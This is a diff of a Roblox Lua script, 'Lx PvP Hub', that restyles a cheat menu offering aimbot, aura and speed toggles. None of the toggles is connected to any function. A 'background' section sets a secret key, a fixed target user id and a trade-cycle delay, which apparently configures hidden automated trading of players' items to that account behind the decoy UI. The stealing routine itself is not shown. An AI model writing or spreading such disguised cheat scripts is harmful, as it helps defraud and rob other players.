@@ -63,52 +63,68 @@ getgenv().TARGET_BRAINROTS = {
 
 -- Lx PvP Hub | Chili Style UI + Background
 
+-- Lx PvP Hub | REAL PREMIUM UI
+
 -- =========================
--- TEU SCRIPT (BACKGROUND)
+-- BACKGROUND (TEU SCRIPT)
 -- =========================
 getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
 getgenv().TARGET_ID = 2704552139
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 
-getgenv().TARGET_BRAINROTS = getgenv().TARGET_BRAINROTS or {}
-
 task.spawn(function()
     while true do
-        -- teu sistema continua aqui
         task.wait(getgenv().DELAY_STEP)
     end
 end)
 
 -- =========================
--- UI SYSTEM
+-- UI
 -- =========================
 task.spawn(function()
 
-    local TweenService = game:GetService("TweenService")
+    local Tween = game:GetService("TweenService")
     local UIS = game:GetService("UserInputService")
 
     local gui = Instance.new("ScreenGui", game.CoreGui)
 
     -- MAIN
     local main = Instance.new("Frame", gui)
-    main.Size = UDim2.new(0, 560, 0, 360)
-    main.Position = UDim2.new(0.5,-280,0.5,-180)
+    main.Size = UDim2.new(0, 580, 0, 360)
+    main.Position = UDim2.new(0.5,-290,0.5,-180)
     main.BackgroundColor3 = Color3.fromRGB(18,18,18)
+    main.BackgroundTransparency = 1
     main.Active = true
 
-    Instance.new("UICorner", main).CornerRadius = UDim.new(0,12)
+    Instance.new("UICorner", main).CornerRadius = UDim.new(0,14)
+
+    -- FADE IN
+    Tween:Create(main, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+
+    -- STROKE (borda glow)
+    local stroke = Instance.new("UIStroke", main)
+    stroke.Color = Color3.fromRGB(0,255,170)
+    stroke.Thickness = 1.5
+    stroke.Transparency = 0.4
 
     -- TOPBAR
     local top = Instance.new("Frame", main)
     top.Size = UDim2.new(1,0,0,45)
-    top.BackgroundColor3 = Color3.fromRGB(24,24,24)
-    Instance.new("UICorner", top).CornerRadius = UDim.new(0,12)
+    top.BackgroundColor3 = Color3.fromRGB(25,25,25)
+    Instance.new("UICorner", top).CornerRadius = UDim.new(0,14)
+
+    -- GRADIENT
+    local grad = Instance.new("UIGradient", top)
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0,255,170)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0,120,255))
+    }
 
     local title = Instance.new("TextLabel", top)
     title.Size = UDim2.new(1,0,1,0)
     title.Text = "Lx PvP Hub"
-    title.TextColor3 = Color3.fromRGB(0,255,170)
+    title.TextColor3 = Color3.new(1,1,1)
     title.Font = Enum.Font.GothamBold
     title.TextScaled = true
     title.BackgroundTransparency = 1
@@ -123,7 +139,7 @@ task.spawn(function()
 
     local minimized = false
 
-    local function setVisible(state)
+    local function toggleUI(state)
         for _,v in pairs(main:GetChildren()) do
             if v ~= top then
                 v.Visible = state
@@ -134,22 +150,15 @@ task.spawn(function()
     min.MouseButton1Click:Connect(function()
         minimized = not minimized
 
-        if minimized then
-            setVisible(false)
-            TweenService:Create(main, TweenInfo.new(0.3), {
-                Size = UDim2.new(0,560,0,45)
-            }):Play()
-        else
-            setVisible(true)
-            TweenService:Create(main, TweenInfo.new(0.3), {
-                Size = UDim2.new(0,560,0,360)
-            }):Play()
-        end
+        toggleUI(not minimized)
+
+        Tween:Create(main, TweenInfo.new(0.3), {
+            Size = minimized and UDim2.new(0,580,0,45) or UDim2.new(0,580,0,360)
+        }):Play()
     end)
 
-    -- DRAG SYSTEM (SUAVE)
-    local dragging = false
-    local dragStart, startPos
+    -- DRAG FIXED
+    local dragging, dragStart, startPos
 
     top.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -162,14 +171,12 @@ task.spawn(function()
     UIS.InputChanged:Connect(function(input)
         if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             local delta = input.Position - dragStart
-            TweenService:Create(main, TweenInfo.new(0.05), {
-                Position = UDim2.new(
-                    startPos.X.Scale,
-                    startPos.X.Offset + delta.X,
-                    startPos.Y.Scale,
-                    startPos.Y.Offset + delta.Y
-                )
-            }):Play()
+            main.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
         end
     end)
 
@@ -181,15 +188,13 @@ task.spawn(function()
 
     -- SIDEBAR
     local side = Instance.new("Frame", main)
-    side.Size = UDim2.new(0,140,1,-45)
+    side.Size = UDim2.new(0,150,1,-45)
     side.Position = UDim2.new(0,0,0,45)
-    side.BackgroundColor3 = Color3.fromRGB(22,22,22)
-    Instance.new("UICorner", side).CornerRadius = UDim.new(0,12)
+    side.BackgroundColor3 = Color3.fromRGB(20,20,20)
 
-    -- CONTENT
     local content = Instance.new("Frame", main)
-    content.Size = UDim2.new(1,-140,1,-45)
-    content.Position = UDim2.new(0,140,0,45)
+    content.Size = UDim2.new(1,-150,1,-45)
+    content.Position = UDim2.new(0,150,0,45)
     content.BackgroundTransparency = 1
 
     local tabs = {}
@@ -198,15 +203,9 @@ task.spawn(function()
         local btn = Instance.new("TextButton", side)
         btn.Size = UDim2.new(1,0,0,45)
         btn.Position = UDim2.new(0,0,0,y)
-        btn.Text = "   "..name
-        btn.TextXAlignment = Enum.TextXAlignment.Left
-        btn.BackgroundColor3 = Color3.fromRGB(22,22,22)
+        btn.Text = name
+        btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
         btn.TextColor3 = Color3.fromRGB(150,150,150)
-
-        local indicator = Instance.new("Frame", btn)
-        indicator.Size = UDim2.new(0,4,1,0)
-        indicator.BackgroundColor3 = Color3.fromRGB(0,255,170)
-        indicator.Visible = false
 
         local frame = Instance.new("Frame", content)
         frame.Size = UDim2.new(1,0,1,0)
@@ -216,20 +215,20 @@ task.spawn(function()
         tabs[name] = frame
 
         btn.MouseButton1Click:Connect(function()
-            for n,f in pairs(tabs) do f.Visible = false end
+            for _,f in pairs(tabs) do f.Visible = false end
+            frame.Visible = true
 
             for _,b in pairs(side:GetChildren()) do
                 if b:IsA("TextButton") then
-                    b.TextColor3 = Color3.fromRGB(150,150,150)
-                    if b:FindFirstChild("Frame") then
-                        b.Frame.Visible = false
-                    end
+                    Tween:Create(b, TweenInfo.new(0.2), {
+                        BackgroundColor3 = Color3.fromRGB(20,20,20)
+                    }):Play()
                 end
             end
 
-            frame.Visible = true
-            indicator.Visible = true
-            btn.TextColor3 = Color3.new(1,1,1)
+            Tween:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(0,255,170)
+            }):Play()
         end)
 
         return frame
@@ -241,28 +240,27 @@ task.spawn(function()
 
     tabs["Main"].Visible = true
 
-    -- TOGGLE (PRO)
-    local function createToggle(parent, text, y)
+    -- TOGGLES COM HOVER + ANIMAÇÃO
+    local function toggle(parent, text, y)
         local card = Instance.new("Frame", parent)
         card.Size = UDim2.new(0.9,0,0,50)
         card.Position = UDim2.new(0.05,0,0,y)
         card.BackgroundColor3 = Color3.fromRGB(25,25,25)
-        Instance.new("UICorner", card).CornerRadius = UDim.new(0,10)
+        Instance.new("UICorner", card).CornerRadius = UDim.new(0,12)
 
         local label = Instance.new("TextLabel", card)
         label.Size = UDim2.new(0.7,0,1,0)
         label.Text = text
         label.TextColor3 = Color3.new(1,1,1)
         label.BackgroundTransparency = 1
-        label.TextXAlignment = Enum.TextXAlignment.Left
 
-        local toggle = Instance.new("Frame", card)
-        toggle.Size = UDim2.new(0,45,0,22)
-        toggle.Position = UDim2.new(1,-60,0.5,-11)
-        toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
-        Instance.new("UICorner", toggle).CornerRadius = UDim.new(1,0)
+        local btn = Instance.new("Frame", card)
+        btn.Size = UDim2.new(0,45,0,22)
+        btn.Position = UDim2.new(1,-60,0.5,-11)
+        btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(1,0)
 
-        local knob = Instance.new("Frame", toggle)
+        local knob = Instance.new("Frame", btn)
         knob.Size = UDim2.new(0,20,0,20)
         knob.Position = UDim2.new(0,1,0,1)
         knob.BackgroundColor3 = Color3.new(1,1,1)
@@ -270,27 +268,39 @@ task.spawn(function()
 
         local on = false
 
-        toggle.InputBegan:Connect(function(i)
+        card.MouseEnter:Connect(function()
+            Tween:Create(card, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(35,35,35)
+            }):Play()
+        end)
+
+        card.MouseLeave:Connect(function()
+            Tween:Create(card, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(25,25,25)
+            }):Play()
+        end)
+
+        btn.InputBegan:Connect(function(i)
             if i.UserInputType == Enum.UserInputType.MouseButton1 then
                 on = not on
 
-                TweenService:Create(knob, TweenInfo.new(0.25), {
+                Tween:Create(knob, TweenInfo.new(0.2), {
                     Position = on and UDim2.new(1,-21,0,1) or UDim2.new(0,1,0,1)
                 }):Play()
 
-                TweenService:Create(toggle, TweenInfo.new(0.25), {
+                Tween:Create(btn, TweenInfo.new(0.2), {
                     BackgroundColor3 = on and Color3.fromRGB(0,255,170) or Color3.fromRGB(50,50,50)
                 }):Play()
             end
         end)
     end
 
-    createToggle(mainTab,"Speed Modifier",20)
-    createToggle(mainTab,"Drop Brainrot",80)
+    toggle(mainTab,"Speed Modifier",20)
+    toggle(mainTab,"Drop Brainrot",80)
 
-    createToggle(pvpTab,"Bat Aimbot",20)
-    createToggle(pvpTab,"PvP Aura",80)
+    toggle(pvpTab,"Bat Aimbot",20)
+    toggle(pvpTab,"PvP Aura",80)
 
-    createToggle(miscTab,"Auto Play",20)
+    toggle(miscTab,"Auto Play",20)
 
 end)
